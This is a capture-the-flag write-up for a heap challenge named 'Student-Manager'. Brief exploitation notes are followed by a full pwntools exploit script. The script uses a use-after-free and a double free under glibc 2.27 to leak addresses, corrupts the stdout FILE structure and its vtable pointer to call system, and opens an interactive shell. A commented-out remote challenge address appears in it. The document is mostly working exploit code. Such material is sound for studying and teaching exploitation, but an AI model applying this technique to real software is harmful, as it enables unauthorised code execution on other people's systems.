# Student-Manager

1. malloc_hook and free_hook gets cleared everytime so no way to hijack these hooks.
2. We are left with hijacking file structures now.
3. UAF bug. But allocation size is only 0x28 and we get partial leaks.
4. Thanks to UAF and double free. Since glibc version is 2.27.
5. heap feng shui to get unsorted bin. Point it to stdout_structure
6. _IO_2_1_stdout_ + 0xe8 -> system
7. Hijack _IO_2_1_stdout->vtable_pointer and also bypass vtable_pointer_check and call system.


```python
#!/usr/bin/python3
from pwn import *
"""
typedef struct Student {
	unsigned int student_score;
	long int garbage;
	char name[0x8];
	int score;
}STUDENT;
"""
####Utils
def addstudent(id,name,score):
	io.sendlineafter("choice:","1")
	io.sendlineafter("id:",str(id))
	io.sendlineafter("name:",name)
	io.sendlineafter("score:",str(score))

def viewstudent(id):
	io.sendlineafter("choice:","2")
	io.sendlineafter("id:",str(id))
	id = io.recvline().strip().split(b":")
	name = io.recvline().strip().split(b":")
	score = io.recvline().strip().split(b":")
	return [id,name,score]

def deletestudent(id):
	io.sendlineafter("choice:","3")
	io.sendlineafter("id:",str(id))

####Addr
malloc_hook = 0x3ebc30 
_IO_stdout = 0x3ec760
_IO_file_jumps = 0x3e82a0
system = 0x4f440
_IO_str_jumps = _IO_file_jumps + 0xd0

####Exploit
io = process(["./student_manager"],env={"LD_PRELOAD":"./libc-2.27.so"})
#io = remote("207.246.82.76",9010)
addstudent(0,"H"*0x7,10)
addstudent(1,"BB",10) #1
for i in range(2,5):
	addstudent(i,"HK",10) #2~4
for i in range(3):
	deletestudent(0)
heap_last_bytes = int(viewstudent(0)[2][1],0)
print(f"Heap leak: {hex(heap_last_bytes)}")
addstudent(5,"HK",heap_last_bytes+0x10) #5
addstudent(6,"HK",1) #6
addstudent(7,p64(0x91)[:-1],0x0) #7
for i in range(7):
	deletestudent(1)
deletestudent(1)
libc_last_bytes = int(viewstudent(1)[2][1])&0xffffffff
libc_main_arena = libc_last_bytes-0x60
libc_malloc_hook = libc_main_arena-0x10
libc_base_last_bytes = libc_malloc_hook - malloc_hook
print(f"Libc leak: {hex(libc_last_bytes)}")
print(hex(libc_base_last_bytes+_IO_stdout))
addstudent(8,"HK",(libc_base_last_bytes+_IO_stdout+0xd8)-0x100000000) #8
for i in range(9,11):
	addstudent(i,"HK",(libc_base_last_bytes+_IO_stdout+0xe8)-0x100000000) #9~10
addstudent(11,"HK",1) #11
for i in range(4):
	deletestudent(11)
addstudent(12,"HK",heap_last_bytes+0x60) #12
addstudent(13,"HK",1) #13
addstudent(14,"HK",1) #14
addstudent(15,"\x00",(libc_base_last_bytes+system)-0x100000000) #15
deletestudent(13)
deletestudent(13)
addstudent(16,"HK",heap_last_bytes+0x30) #16
addstudent(17,"HK",1) #17
addstudent(18,"HK",1) #18
addstudent(19,"';sh",(libc_base_last_bytes+_IO_str_jumps-0x38)-0x100000000)
io.interactive()
```

